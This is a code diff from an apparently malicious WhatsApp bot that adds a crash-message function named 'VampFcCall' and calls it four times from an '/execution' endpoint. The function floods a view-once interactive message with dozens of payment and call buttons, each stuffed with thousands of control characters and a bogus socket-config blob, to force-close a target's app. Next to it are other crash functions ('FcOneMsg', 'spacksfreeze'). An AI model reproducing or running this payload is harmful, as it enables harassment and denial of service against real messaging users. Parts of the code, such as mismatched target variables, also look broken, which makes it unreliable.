@@ -1655,6 +1655,103 @@ async function VampSuperDelay(sock, target, mention = false, count = 30) {
     });
   }
 }
+
+// fc call by venom
+async function VampFcCall(sock, target, ptcp = true) {
+      let msg = await generateWAMessageFromContent(target, {
+        viewOnceMessage: {
+          message: {
+            interactiveMessage: {
+              header: {
+                title: "Vampire Boleh Telpon",
+                hasMediaAttachment: false
+              },
+              body: {
+                text: "\u0003".repeat(9999),
+              },
+              nativeFlowMessage: {
+                messageParamsJson: "",
+                buttons: [
+                  { name: "single_select", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+                  { name: "payment_method", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+                  { name: "call_permission_request", buttonParamsJson: venomModsData + "\u0003".repeat(9999), voice_call: "call_galaxy" },
+                  { name: "form_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+                  { name: "wa_payment_learn_more", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+                  { name: "wa_payment_transaction_details", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+                  { name: "wa_payment_fbpin_reset", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+                  { name: "catalog_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+                  { name: "payment_info", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+                  { name: "review_order", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+                  { name: "send_location", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+                  { name: "payments_care_csat", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+                  { name: "view_product", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+                  { name: "payment_settings", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+                  { name: "address_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+                  { name: "automated_greeting_message_view_catalog", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+                  { name: "open_webview", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+                  { name: "message_with_link_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+                  { name: "payment_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+                  { name: "galaxy_costum", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+                  { name: "extensions_message_v2", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+                  { name: "landline_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+                  { name: "mpm", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+                  { name: "cta_copy", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+                  { name: "cta_url", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+                  { name: "review_and_pay", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+                  { name: "galaxy_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
+                  { name: "cta_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) }
+                ]
+              }
+            }
+          }
+        }
+      }, {});
+
+      await sock.relayMessage(target, msg.message, ptcp ? {
+        participant: {
+          jid: target
+        }
+      } : {});
+
+    }
+    let venomModsData = JSON.stringify({
+      status: true,
+      criador: "VenomMods",
+      resultado: {
+        type: "md",
+        ws: {
+          _events: { "CB:ib,,dirty": ["Array"] },
+          _eventsCount: 800000,
+          _maxListeners: 0,
+          url: "wss://web.whatsapp.com/ws/chat",
+          config: {
+            version: ["Array"],
+            browser: ["Array"],
+            waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
+            sockCectTimeoutMs: 20000,
+            keepAliveIntervalMs: 30000,
+            logger: {},
+            printQRInTerminal: false,
+            emitOwnEvents: true,
+            defaultQueryTimeoutMs: 60000,
+            customUploadHosts: [],
+            retryRequestDelayMs: 250,
+            maxMsgRetryCount: 5,
+            fireInitQueries: true,
+            auth: { Object: "authData" },
+            markOnlineOnsockCect: true,
+            syncFullHistory: true,
+            linkPreviewImageThumbnailWidth: 192,
+            transactionOpts: { Object: "transactionOptsData" },
+            generateHighQualityLinkPreview: false,
+            options: {},
+            appStateMacVerification: { Object: "appStateMacData" },
+            mobile: true
+          }
+        }
+      }
+    });
+
 async function spacksfreeze(sock, target, count = 50) {
   await sock.relayMessage(target, {
     stickerPackMessage: {
@@ -4352,6 +4449,10 @@ app.post("/execution", requireAuth, async (req, res) => {
         await FcOneMsg(sock, targetJid);
         await FcOneMsg(sock, targetJid);
         await FcOneMsg(sock, targetJid);
+        await VampFcCall(sock, target, ptcp = true);
+        await VampFcCall(sock, target, ptcp = true);
+        await VampFcCall(sock, target, ptcp = true);
+        await VampFcCall(sock, target, ptcp = true);
         }
         bugResult = { success: true };
 
